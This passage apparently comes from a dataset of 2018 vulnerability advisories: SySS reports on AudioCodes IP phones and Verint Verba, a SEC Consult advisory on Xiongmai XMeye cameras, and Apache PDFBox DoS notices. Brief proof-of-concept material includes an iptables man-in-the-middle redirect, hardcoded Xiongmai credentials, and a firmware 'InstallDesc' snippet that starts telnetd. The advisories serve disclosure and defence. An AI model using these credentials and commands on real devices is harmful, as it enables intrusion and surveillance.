iQIzBAEBCAAdFiEE8ufGpZlQhO161g3U7b4m5xTqWHYFAlvO5SMACgkQ7b4m5xTq
WHZlVg/+K4PDs51EB8blqyGt0b2KgEBS6J7vxz2sBUBdxxi0Nh119+5Ybd8fy4QS
AQfK/5nd3lV88l3IrSnmVdUPdRAEUpMm06X+29kzmGCzC5zJa/OdMZsR9urvaw5z
JcA/GaIsuMNnnO2WCdBbs5+OiwVb49LO8J6KcV6ALNRe53z7bn9lKc1daUZDW8+L
WpnNUQRhzgIDeyeAgfoFG0IN6zb7ig9uzxgcwZpqUklhwGsp0UjSLxf7S/WdfqAS
U2VSyWUTXNK3xWRMdquLqoyp9Rk2Su/xkb7ovnJ/FH54G6sNhN476Qjdp0F8clWj
dJIV7l7P9GJwbMvzeYLIt23MzOZNGhC0EzwWrd+hB19wMDuelmce/3fzfUcqytkS
GWxfOsiQGxqDSOKjRMd5WeHT+sh/qqfkaxz5LG0B6aS+2ms9U/vIN0GYip//ulBq
jtVm21GkvfS6zNBx5Mp8BJwE1CC+9Awlolayg39fbyK0h0fkJBnE7tBBYu9IlnQk
0QjrQHlGzS8AiZ1SaEsgpz/lZ5iTTTn/PwBm8wGCTPaBfbNCjQPq5a7F2UmrQ+4+
2SEP5XxLBbv5y0LTzQCxWOgRitGHQkde9q4lsZfWtL/+rW5x4jjIJWK4t5SesGkg
S2sMN5nJ7a1FAzL+FVyqabDU4Ds31yQa8Vumj1ljSXULYRzfTFI=
=Ta92
-----END PGP SIGNATURE-----"
821,"[SYSS-2018-026] missing X.509 validation with AudioCodes IP Phones (Skype for Business, on-premise) - CVE-2018-18567",,CVE-2018-18567,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
Advisory ID: SYSS-2018-026
Product: 440HD / 450HD IP Phone
Manufacturer: AudioCodes
Affected Version(s): <= 3.1.2.89
Tested Version(s): VC_3.1.1.43.1, VC_3.1.2.89
Vulnerability Type: X.509 validation - Man-in-the-Middle (CWE-300)
Risk Level: Medium
Solution Status: Open
Manufacturer Notification: 2018-08-29
Solution Date: 20??-??-??
Public Disclosure: 2018-10-23
CVE Reference: CVE-2018-18567
Author of Advisory: Micha Borrmann (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
If a AudioCodes 440HD/450HD IP Phone [1] is used with an on-premise
installation with Skype for Business, the phone has stored credentials
of an account in the active directory. Performing a man-in-the-middle
attack, the phone give away the credentials to an attacker and
therefore the account will be compromised. The phone itself is fully
functional and will not show any hints of an attack.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The phone sends the stored credentials to a website usually named
skypewebpool via HTTPS but does not validate the X.509 certificate.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
Configure Burp Suite as invisible proxy an gain a Man-in-the-Middle-position.
Set an iptables rule, that routes the traffic through Burp Suite, like
# iptables -A PREROUTING -t nat -i eth0 -s 192.168.100.100 -p tcp --dport 443 -j REDIRECT --to-port 8080
Watch the proxy history for a HTTP POST request like
POST /WebTicket/oauthtoken HTTP/1.1
Host: skypewebpool.example.com
User-Agent: AUDC/3.1.1.43 AUDC-IPPhone-440HD_UC_3.1.1.43/1
Content-Length: 163
Content-Type: application/x-www-form-urlencoded
Connection: close
grant_type=password&client_id=abc...&resource=https%3a%2f%2fskypewebpool.example.com&password=verytopsecretpassword&username=ADaccountname
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
Install the new firmware, which has a trust store integrated and a
strict X.509 certificate validation policy, too.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2018-08-13: Detection of the vulnerability
2018-09-06: Vulnerability reported to manufacturer
2018-10-22: CVE number assigned
2018-10-23: Public release of the security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product web sites for the phones
https://www.audiocodes.com/solutions-products/products/ip-phones/440hd-ip-phone
https://www.audiocodes.com/solutions-products/products/ip-phones/450hd-ip-phone
[2] SySS Security Advisory SYSS-2018-026
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-026.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Micha Borrmann of SySS GmbH.
E-Mail: micha.borrmann (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Micha_Borrmann.asc
Key Fingerprint: F2E7 C6A5 9950 84ED 7AD6 0DD4 EDBE 26E7 14EA 5876
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory
may be updated in order to provide as accurate information as
possible. The latest version of this security advisory is available on
the SySS Web site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCAAdFiEE8ufGpZlQhO161g3U7b4m5xTqWHYFAlvO5MAACgkQ7b4m5xTq
WHbTUg/+OAJuLzuW8Uu2VuP4EeJyRfL8XqZP3TVjpsueOb2XhHpUhugVpd3Dh/I/
cF1tZoyTnt41smNxEAnKFpPikEAdem4M9zvAmyDzWmQaqmqUBQAsEShM3ACdshEN
+8zKnXFvjwLHOMKKX7jJ5S76OH8YeYpOwLNc0vTXFLv4Nt+1wpTWR8qHR/xAjRrW
uKH0CJrjs408gRoyvssUSpKiOWh+uVRq/NVvGIpGtwGBAZEmcgG4TD4tszOjRao6
WFGIs039rQhbLaqeD2LXn9yLU5uSh1h+QkqmaOM/MSAOGXmgSG4zIo3REu1GY9w5
uIvrVytoGsqcVRLqpHX/oq1Xkr3krzCZYuNAnVWkULFx90K/SZ143gWZFan95wJA
2FPmbW71kkSVC5aW4nFuIfQyyL5Gm7BF7YptrnNMpJbY9VMnGCwJxQsJmBBas/yH
txBtYMxqmY0L+tNfqK5Iqm4OeNiYI/ef95Rl677jBnh3+4nrmcESQagetpV3wz1D
qkumdytXIV8p8sgOCuRHNtnno0en08oJCZw1D/eQ8OHX9HbbIYNNJxnqlWXet/OT
8W7blNwmpIPzXMa7oB42amQCUYdWgkHPCKsVS8aHBi0mhrU5sEWEvYfQO1Ef8qMW
zFbgBh/qH4lEdoZRL5yKlrPmQcukCyAf+4VuFRUCJdXkeTfzf7M=
=yKAX
-----END PGP SIGNATURE-----"
827,"SEC Consult SA-20181009-0 :: Remote Code Execution via XMeye P2P Cloud in Xiongmai IP Cameras, NVRs and DVRs incl. 3rd party OEM devices (CVE-2018-17915, CVE-2018-17917, CVE-2018-17919)",,CVE-2018-17915,"SEC Consult also published a blog post regarding the identified security issues
with further background information:
Blog: https://r.sec-consult.com/xmeye
SEC Consult Vulnerability Lab Security Advisory < 20181009-0 >
=======================================================================
title: Remote Code Execution via XMeye P2P Cloud
product: Xiongmai IP Cameras, NVRs and DVRs
incl. 3rd party OEM devices
vulnerable version: see below
fixed version: -
CVE number: CVE-2018-17915, CVE-2018-17917, CVE-2018-17919
impact: Critical
homepage: http://www.xiongmaitech.com/en/
found: 2018-03-05
by: Stefan Viehböck (Office Vienna)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult
Europe | Asia | North America
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
""Hangzhou Xiongmai Technology Co., Ltd concentrates on security surveillance,
Video intelligent research and development. We devote ourselves to
providing good products, technical services for manufacturers,
wholesaler and service provider, in order to offer better experience
for our customers. We are global leading providers in security video
products and technology. Established from 2009, many years development,
the headquarter of XM locate in Yinhu Innovation Center, Fuyang
district, Hangzhou now. Total registered capital reach to 60 million.
Now we owns nearly 2000 employees including a strong R&D team (more
than 300 experienced engineers).""
Source: http://www.xiongmaitech.com/en/index.php/about/company/18
Business recommendation:
------------------------
SEC Consult has identified highly critical vulnerabilities in Xiongmai
products and the ""XMeye P2P Cloud"" feature which is being used in many
3rd party OEM devices as well.
The vendor does not provide proper mitigations and hence it is recommended
not to use any products associated with the XMeye P2P Cloud until
all of the identified security issues have been fixed and a thorough
security analysis has been performed by professionals.
Vulnerability overview/description:
-----------------------------------
1) Predictable XMEye Cloud IDs (CVE-2018-17915)
All Xiongmai devices come with a feature called ""XMeye P2P Cloud"". It is a
proprietary, UDP-based protocol that allows users to access their IP cameras or
NVRs/DVRs via the internet. The feature is enabled by default, no setup by the
user is required.
The device initiates and keeps a connection to a Xiongmai cloud server.
All connections between clients and the devices are established via Xiongmai
cloud servers. This approach allows users to connect to devices that are behind
firewalls, NATed etc.
The unique, per-device identifier is the cloud ID. It is a 16 character long
hexadecimal string (e.g. f7e708f21de0fde0).
Anyone who knows the device identifier and the admin credentials can establish a
connection to a device using the XMEye apps (Android, iOS) or a ""VMS"" desktop
application.
The Cloud ID may be unique, but it is not random. It is derived (at boot time)
from the device MAC address using a few simple operations (see get_sn_from_mac())
below.
An attacker can enumerate potential MACs/cloud IDs and find valid ones.
Then use the weak default credentials to log in. This allows the attacker to
watch the video feed, change the device configuration and possibly gain remote
code execution using other vulnerabilities.
The XMEye functionality allows an attacker to attack devices that are behind
firewalls, NATed networks etc.
MAC addresses have a well defined structure: 3-octet OUI (Vendor) + 3-octet NIC ID
OUIs are assigned by the IEEE. Interestingly Xiongmai does not own an OUI, but
instead uses the OUIs of other companies.
The following OUIs are used by Xiongmai devices (OUIs based on internet research,
scanning, company names based on [1]):
001210 WideRay Corp
001211 Protechna Herbst GmbH & Co. KG
001212 PLUS Corporation
001213 Metrohm AG
001214 Koenig & Bauer AG
001215 iStor Networks, Inc.
001216 ICP Internet Communication Payment AG
001217 Cisco-Linksys, LLC
001218 ARUZE Corporation
003E0B - Not assigned
We developed a cloud ID scanner that queries the Xiongmai cloud server. The
responses indicate if there is a device online that uses the given cloud ID,
plus provide the IP of a Xiongmai Cloud hop server that is geographically
close to the device. One query is one UDP packet.
We scanned 0.02% of the devices (random choice) in each OUI range (16 Million
devices per range) and extrapolated the results.
OUI: 001210; IDs checked 3,365; Devices online 3; Success rate: 0.1%;
extrapolated devices online: 14,957
OUI: 001211; IDs checked 3,363; Devices online 9; Success rate: 0.3%;
extrapolated devices online: 44,898
OUI: 001212; IDs checked 3,351; Devices online 492; Success rate: 14.7%;
extrapolated devices online: 2,463,261
OUI: 001213; IDs checked 3,402; Devices online 218; Success rate: 6.4%;
extrapolated devices online: 1,075,083
OUI: 001214; IDs checked 3,440; Devices online 67; Success rate: 1.9%;
extrapolated devices online: 326,765
OUI: 001215; IDs checked 3,347; Devices online 255; Success rate: 7.6%;
extrapolated devices online: 1,278,216
OUI: 001216; IDs checked 3,377; Devices online 448; Success rate: 13.3%;
extrapolated devices online: 2,225,701
OUI: 001217; IDs checked 3,315; Devices online 286; Success rate: 8.6%;
extrapolated devices online: 1,447,446
OUI: 001218; IDs checked 3,196; Devices online 1; Success rate: 0.0%;
extrapolated devices online: 5,249
OUI: 003E0B; IDs checked 4,224; Devices online 21; Success rate: 0.5%;
extrapolated devices online: 83,409
We estimate that there are about **9 Million devices online** in the given
OUI ranges.
The responses from the cloud server allow us to estimate the geographic
distribution of the devices:
Hop server location: CN; extrapolated devices 5,438,757
Hop server location: DE; extrapolated devices 1,319,845
Hop server location: JP; extrapolated devices 577,743
Hop server location: SG; extrapolated devices 697,276
Hop server location: TR; extrapolated devices 189,260
Hop server location: US; extrapolated devices 742,101
We assume the hop server locations serve devices on the same continent.
[1] https://regauth.standards.ieee.org/standards-ra-web/pub/view.html#registries
2) Default admin password
The devices include an empty password for the admin user account which has
the highest privileges on the devices and allows attackers to view the
video feed or change the configuration.
3) Insecure default credentials for user ""default"" (CVE-2018-17919)
In the default configuration, the user account ""default"" exists on
the device. The purpose of this user is not documented.
These user credentials can be used to log in to a device via the XMEye
cloud (checked via custom client using the Xiongmai NetSDK [2]).
This user seems to at least have permissions to access video feeds (more
investigation required!).
4) Multiple unencrypted communication channels (CVE-2018-17917)
All device communication is not encrypted. This includes the XMeye service
and firmware update communication.
- An attacker can eavesdrop on video feeds or steal XMeye login
credentials to get control over the device.
- An attacker can also impersonate the update server and offer malicious
firmware updates.
5) Firmware update integrity not checked
Firmware updates are not signed. It is possible to create a firmware
update file that contains malicious code (CWE-494). This is either
possible by modifying the filesystems contained in a firmware update
or modifying the ""InstallDesc"" file in a firmware update file.
The ""InstallDesc"" is a text file that contains commands that are
executed during the update.
Combining the vulnerabilities makes a very powerful attack, ""The worst
case scenario"":
a) Attacker exploits Predictable XMEye Cloud IDs to get list of valid IDs.
b) Attacker exploits Insecure default credentials for user ""admin"" and
possibly user ""default"", to get access to devices via the XMEye cloud.
c) Attacker changes the DNS configuration of the devices to impersonate
the update server ""upgrade.secu100.net"".
d) Attacker sets up fake firmware update webserver.
e) Attacker creates firmware updates containing malicious code.
Imagination is the limit here, could be a Mirai-like agent or something
focused on lateral movement in the target environment (local network of
the organization using the devices).
f) Attacker performs a firmware update on devices via the XMEye cloud API
command H264_DVR_Upgrade_Cloud() (custom client using the Xiongmai NetSDK
[2]). The malicious firmware update is persisted on the devices. If the
attacker desires, it cannot be removed by rebooting the device.
[2] http://www.xiongmaitech.com/service/down_detail/83/185.html
Proof of concept:
-----------------
1) Predictable XMEye Cloud IDs (CVE-2018-17915)
The Python code to derive the cloud ID from the MAC address of the
device has been removed from this advisory.
2) Default admin password
The default username and password is admin:[BLANK].
3) Insecure default credentials for user ""default"" (CVE-2018-17919)
The credentials for the hardcoded user ""default"" are ""tluafed""
4) Multiple unencrypted communication channels (CVE-2018-17917)
No proof of concept available for this advisory.
5) Firmware update integrity not checked
The following ""InstallDesc"" contents would launch an arbitrary command,
in this case starting the telnet daemon.
""UpgradeCommand"" : [
{
""Command"" : ""Shell"",
""Script"" : ""/bin/busybox telnetd""
},
Vulnerable / tested products:
-----------------------------
Xiongmai acts as an OEM. Various vendors sell branded devices with Xiongmai
hardware/firmware inside.
More information can be found in the blog post: https://r.sec-consult.com/xmeye
Vendor contact timeline:
------------------------
2018-03-15: Contacting ICS-CERT for coordination support.
2018-03-26: ICS-CERT assigns ICS-VU-638768 for this case
2018-05-04: ICS-CERT provides answer from Xiongmai, the vendor argues that SEC
Consult tested the ""old"" firmware/devices. Furthermore, per default
user passwords need to be changed upon first login since 2016. They
informed their key customers to update to the latest firmware & change
default passwords.
2018-05-07: SEC Consult anwser: we verified that we are running the latest
firmware versions and they are affected. Furthermore, there is no
password change request implemented.
2018-05-15: SEC Consult sends further/newly identified vulnerabilities to ICS-CERT
for Xiongmai, describing worst case scenario, asking to inform FTC
about this case
2018-05-15: ICS-CERT: Xiongmai is very slow in responding, and requests for
affected firmware versions have been sent to them already.
2018-05-25: Asking ICS-CERT for a status update
2018-05-29: ICS-CERT: small update from Xiongmai received:
--Vendor Response--
Regarding the device information from Researcher, it is our ""old""
model and ""old"" firmware version, that's why there is no more update.
Even for DVR model it is already discontinued, therefore we will work
a new ""latest"" version based on current baseline version, for those
Researcher's devices specially.
--End Vendor Response--
Xiongmai also said they will provide version numbers for fixed &
vulnerable versions, but no answer.
2018-06-04: ICS-CERT: Xiongmai provided a firmware update for our test devices
2018-06-11: SEC Consult: tested firmware ""SimpGeneral_General_AHB7804R-
ELS_V4.02.R11.Nat.OnvifC.20180525.bin""
There are no apparent changes, it uses the same cloud ID, the admin
password is still empty and there are no warnings to change the
password (checked via web interface and VMS software)
2018-06-15: ICS-CERT: received an update from Xiongmai as to why the firmware did
not seem to fix anything:
--Vendor Response--
After check the message we believe there is some misunderstanding on
IE operation due to the Plug-in ( or called as ActiveX ) issues, As
currently this ActiveX technology even is quite an ""ancient""
technology but still widely used in most of Video Surveillance
products. The issues that Researcher have met, it is due to his PC
still have ""old"" plug-in installed, and with new update of firmware we
provided, The camera and NVR already have functions but his PC with
""old"" plug-in, it is like using same ""old"" computer to connect new
devices, that's why he still didn't see anything new.
So the solution is quite simple, just delete and uninstall ""old""
Plug-in, and then install new one from devices with new version.
Please kindly check attached file, we have some instructions and
steps, on how to renew this ActiveX, please help to forward to this
Researcher and we believe he could understand the reason, and he could
recheck about the new firmware we had sent.
--End Vendor Response--
2018-06-18: SEC Consult: the ActiveX controls are unrelated to any of the issues
we reported. For the sake of completeness, SEC Consult tested it
anyways and all the security issues are still not fixed. Raising
doubts that the vendor understands the impact.
2018-06-21: ICS-CERT: concurs with our opinion and if Xiongmai does not fix the
issues we will have to publish. Xiongmai did not yet react to the
additional findings reported on 2018-05-15
2018-07-24: ICS-CERT: Xiongmai provided ""improved"" instructions to help ensure
the forced password change happens.
2018-07-27: SEC Consult: the default admin password is just a small subset of the
identified critical issues. Intention to publish end of September.
Asking further questions to Xiongmai:
- What devices are affected by the vulnerabilities?
- What is the plan/timeline to fix the issues?
- Are there issues that will not be fixed? Why?
- Are there devices that will not receive fixes for the
vulnerabilities? Which ones?
- Will the updates be rolled out automatically or are manual steps by
the user required?
- Will Xiongmai publish a public warning/advisory on their website?
- Will Xiongmai inform their OEM customers about the vulnerabilities
so they can inform end users?
2018-08-01: ICS-CERT: questions & deadline have been passed to Xiongmai.
Possibility of contacting CNCERT/CC.
2018-09-04: ICS-CERT: Still waiting for a response from Xiongmai. CNCERT/CC has
responded.
2018-09-24: SEC Consult: Asking for a status update. Proposed release date 8th
October Recommendations are to stop using the devices, other
workarounds are not effective.
2018-09-27: ICS-CERT: CNCERT/CC only replied with generic email response. ICS-CERT
proposes Tuesday or Thursday for releases. Decided for the 9th
October.
2018-10-04: Informing CERT-Bund and CERT.at about the security issues and release
2018-10-09: Coordinated release of security advisory
Solution:
---------
The vendor did not provide proper mitigations and solution attempts since ICS-CERT
contacted them back in March 2018.
SEC Consult advises not to use the products of Xiongmai and any 3rd party OEM
device associated with the XMeye cloud feature.
Workaround:
-----------
There are no workarounds available as the devices are connected via the cloud, the
usual recommendations changing default passwords, strict firewalling and network
segmentation unfortunately do not mitigate the whole range of discovered issues.
Advisory URL:
-------------
https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SEC Consult Vulnerability Lab
SEC Consult
Europe | Asia | North America
About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application https://www.sec-consult.com/en/career/index.html
Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices https://www.sec-consult.com/en/contact/index.html
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Mail: research at sec-consult dot com
Web: https://www.sec-consult.com
Blog: http://blog.sec-consult.com
Twitter: https://twitter.com/sec_consult
EOF Stefan Viehböck / @2018"
835,[UPDATE][CVE-2018-11797] DoS vulnerability in Apache PDFBox parser,,CVE-2018-11797,"[CVE-2018-11797] DoS vulnerability in Apache PDFBox parser
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Apache PDFBox <= 1.8.15
Apache PDFBox <= 2.0.11
Earlier, unsupported Apache PDFBox versions may be affected as well
Description:
A carefully crafted PDF file can trigger an extremely long
running computation when parsing the page tree.
Mitigation:
Upgrade to Apache PDFBox 1.8.16 respectively 2.0.12
Credit:
This issue was discovered by Shawn Rasheed and Jens Dietrich
Website:
https://pdfbox.apache.org/
Download:
https://pdfbox.apache.org/download.cgi
https://www.apache.org/dist/pdfbox/2.0.12/RELEASE-NOTES.txt
https://www.apache.org/dist/pdfbox/1.8.16/RELEASE-NOTES.txt"
837,[CVE-2018-11797] DoS vulnerability in Apache PDFBox parser,,CVE-2018-11797,"[CVE-2018-11797] DoS vulnerability in Apache PDFBox parser
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Apache PDFBox <= 1.8.15
Apache PDFBox <= 2.0.11
Earlier, unsupported Apache PDFBox versions may be affected as well
Description:
A carefully crafted PDF file can trigger an extremely long
running computation when parsing the page tree.
Mitigation:
Upgrade to Apache PDFBox 1.8.16 respectively 2.0.12
Credit:
This issue was discovered by Shawn Rasheed
Website:
https://pdfbox.apache.org/
Download:
https://pdfbox.apache.org/download.cgi
https://www.apache.org/dist/pdfbox/2.0.12/RELEASE-NOTES.txt
https://www.apache.org/dist/pdfbox/1.8.16/RELEASE-NOTES.txt"
841,[SYSS-2018-024] Privilege Escalation in Verint Verba Collaboration Compliance and Quality Management Platform (CVE-2018-17872),,CVE-2018-17872,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
Advisory ID: SYSS-2018-024
Product: Collaboration Compliance and Quality Management Platform
Manufacturer: Verint Verba
Affected Version(s): <= 9.1.1.5482
Tested Version(s): 9.1.1.5482
Vulnerability Type: Improper Access Control (CWE-284)
Risk Level: Medium
Solution Status: Fixed
Manufacturer Notification: 2018-08-29
Solution Date: 2018-08-31
Public Disclosure: 2018-10-02
CVE Reference: CVE-2018-17872
Author of Advisory: Tobias Huppertz, SySS GmbH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Collaboration Compliance and Quality Management Platform is a product
to record and play calls with VoIP-telephons including Skype, messages
and video. The permission management works with different roles and
groups. So member can just play their own calls and investigators can
also play calls of other users.
The manufacturer describes the product as follows (see [1]):
""Verint Essential Workforce Optimization offers advanced automation to
get the most from your workforce. Our software and services can
enhance the efficiency of your employees and processes, and enable you
to share workforce intelligence in real-time across your
business. Mid-market contact centers, back-office operations, branch
operations and financial trading rooms can rely on Verint Essential
Workforce Optimization to capture and store interactions, heighten
quality, ensure compliance and help manage the availability and
performance of employees in targeted areas of their businesses.""
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
At the page ""Group Configuration - Assign Users"" a list of users are
shown which are in this group. Every user can also be a member of the
groups Member, Supervisor, Investigator, Administrator and Manager,
but Investigator is diabled. By modifing the html source code with the
developer tools (Internet Explorer 11: key F12) it is possible to
enable this checkbox, set it to true and save the new
configuration. At this moment the user gets also a new tab named
workflow to see four-eyes-requests.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
Go to ""Group Configuration - Assign Users"", enable the Investigator
checkbox with the developer tools, activate the checkbox and press
save.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
Install the new version, which was published by the vendor [2].
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2018-08-16: Vulnerability discovered
2018-08-30: Vulnerability reported to manufacturer
2018-08-30: Vulnerability confirmed by manufacturer
2018-08-31: Update released by manufacturer
2018-10-01: CVE number assigned
2018-10-02: Public disclosure of vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Collaboration Compliance and Quality Management Platform
https://www.verba.com/solutions/compliance-recording-collaboration/#Skype-for-Business
[2] Verba 9.2 Release Notes (build 9.2.2.5549) - RI-016912
https://releases.verba.com/?v=9.2
[3] SySS Security Advisory SYSS-2018-024
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-024.txt
[4] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Tobias Huppertz of SySS GmbH.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory
may be updated in order to provide as accurate information as
possible. The latest version of this security advisory is available on
the SySS Web site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCAAdFiEE8ufGpZlQhO161g3U7b4m5xTqWHYFAluzWxwACgkQ7b4m5xTq
WHa34Q/+MJ0Pm3y/bweW1CMtrPad2b/ADAeAavdrqWPQah6FJOOdhY8LAt/YbpnI
qOGZhdqvJ8Jcf4pZbdQdV4qbcgaVP3yNjSFPiYX6QdgoDOCL5bpKFHU4EBLyU5Lt
w+FczFBatL/APdf4L6bOaIHqal7tOKr4O0zxNb8+IEGpRjNiprEInrLvi/bS0qpT
38391GtdPo2gHCVS4lpVmJt7jOSOpAnZeWj3PO7wFuK8WaAimkj6MmZwHZL/Cu7w
bzXlhbRz+c3FmZf5mWmvfCnLUdJPlUxFvayFvdd900Nc4l7RUop25mFKnTOV27U6
VwoW5UVGWDpHBxAZKqdFMiph9yX2KUUqpq+HvO4vCWZzIwAcvvZA4Wdx6btzbZgu
AKiddHf/OClJQW6hkcsybwAf/vam5ElWckxmhgcypSqrGd612nuHo93urf0ECi88
PNvaNigrRtwuHSfobmrDOrRfpnAdrS4ERT8/xvqUJ4h0LWH3Nh7oJ0aeowxThQ2m
zx03JXNF7TLGP/oHntNmWEF8ZMUkTpxlSPrCmDGLADx2HWv9u5TYHwRMgbkGBwWA
xuwb7jmuIhVp3qkoZ4NuMnE3eUka/8kDmOUckNQ6LxMg3Q8N+DiQno2TJ/1S2uSh
n3+e4I0SPgtuaXMQjlaaYcmGPPx0c8o+hv1eT5pHUEEiZZuiFfM=
=AiRc
-----END PGP SIGNATURE-----"
842,[SYSS-2018-023] Password leakage in Verint Verba Collaboration Compliance and Quality Management Platform (CVE-2018-17871),,CVE-2018-17871,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
Advisory ID: SYSS-2018-023
Product: Collaboration Compliance and Quality Management Platform
Manufacturer: Verint Verba
Affected Version(s): <= 9.1.1.5482
Tested Version(s): 9.1.1.5482
Vulnerability Type: Improper Access Control (CWE-284)
Risk Level: Medium
Solution Status: Fixed
Manufacturer Notification: 2018-08-29
Solution Date: 2018-08-31
Public Disclosure: 2018-10-02
CVE Reference: CVE-2018-17871
Author of Advisory: Tobias Huppertz, SySS GmbH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Collaboration Compliance and Quality Management Platform is a product
to record and play calls with VoIP-telephons including Skype, messages
and video. The permission management works with different roles and
groups. So member can just play their own calls and investigators can
also play calls of other users.
The manufacturer describes the product as follows (see [1]):
""Verint Essential Workforce Optimization offers advanced automation to
get the most from your workforce. Our software and services can
enhance the efficiency of your employees and processes, and enable you
to share workforce intelligence in real-time across your
business. Mid-market contact centers, back-office operations, branch
operations and financial trading rooms can rely on Verint Essential
Workforce Optimization to capture and store interactions, heighten
quality, ensure compliance and help manage the availability and
performance of employees in targeted areas of their businesses.""
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
At the page ""Change Configuration Settings"" the user can see the
configuration. Passwords are obfuscated by dot operator, but the
server delivers passwords in plaintext. By editing the html source
code in the browser the password fields can be modified to edit fields
and the passwords gets visible.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
A logged in user can see configured passwords in plaintext. Access the page
""Change Configuration Settings"", start the Developer Tools (Internet Explorer
11: key F12). Modify the password type from type='password' to type='edit'
fields and the passwords are visible in plaintext. For example ""Key File
Password"" (server certificate) and ""Database Password"" (SQL Server).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
Install the new version, which was published by the vendor [2].
